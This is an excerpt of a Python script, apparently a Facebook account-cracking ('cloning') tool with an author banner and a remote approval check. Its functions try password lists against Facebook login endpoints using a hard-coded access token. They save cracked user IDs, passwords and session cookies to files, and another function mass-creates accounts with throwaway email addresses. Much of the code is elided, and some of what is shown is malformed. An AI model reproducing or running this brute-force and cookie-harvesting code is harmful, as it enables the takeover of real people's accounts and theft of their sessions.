...
| $$\  $$$| $$  | $$| $$  | $$| $$      | $$      | $$  \ $$
| $$ \  $$| $$  | $$|  $$$$$$/| $$$$$$$$| $$$$$$$$| $$$$$$$/
|__/  \__/|__/  |__/ \______/ |________/|________/|_______/ \033[1;37m
               
{WHITE}[•]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊    :  HAJI NAJEEB
{WHITE}[•] 𝐀𝐔𝐓𝐇𝐎𝐑         :    MR NAJEEB
{WHITE}[•] 𝐒𝐓𝐘𝐋𝐄              :       ? 
{WHITE}[•] 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏    : 00923148007918
{WHITE}[•] 𝐕𝐄𝐑𝐒𝐈𝐎𝐍.       :  9.6
{WHITE}[•] 𝐘𝐎𝐔𝐓𝐔𝐁𝐄       :  НΑJI ИΑJЄЄВ
{WHITE}================================================
   \33[37;41m\t 𝐋𝐎𝐕𝐄 CНAМAN JAN \33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
...
def approval():
  ...
  try:
    httpCaht = get_response('https://raw.githubusercontent.com/HAJI😹302/aproval/main/approval.txt')
    if realid in httpCaht:
      ...
      print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO HAJI😹II TOOL AND ENJOY \33[0;m")
      print('\33[1;37m ====================================================')
        ...
        try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.HAJI😹.etc..')
                                linex()
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [HAJI😹I-RUNING-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEGEND-HAJI😹I-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                     #   print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HAJI😹I-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HAJI😹I-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                            #    print('\r\r \033[1;34m[HAJI😹I-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                              #  print('\r\r\x1b[1;31m [ALONE-HAJI😹I-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HAJI😹I-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/HAJI😹I-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HAJI😹I-RUNING-M2 ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [HAJI😹I-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                       accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-HAJI😹I-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HAJI😹i-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HAJI😹I-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [HAJI😹I-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAJI😹I-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HAJI😹i-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HAJI😹I-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [HAJI😹-CREATE] \033[1;32mOK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                print("\r\r\033[1;32m [HAJI😹-CP] "+uid+'|'+pas+'|'+coki)
                cp+=1
                pass
                 ...
                 print("\r\r\033[1;32m [HAJI😹-OK] "+uid+'|'+pas+'|'+coki)
                 ok+=1
                 open('/sdcard/HAJI😹-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 linex()
       except Exception as e:
           if not "urllib" and not "perma" in str(e):print(e)
           pass
    file="/sdcard/HAJI😹/CREATE-OK.txt"
    u=5000
    clear()
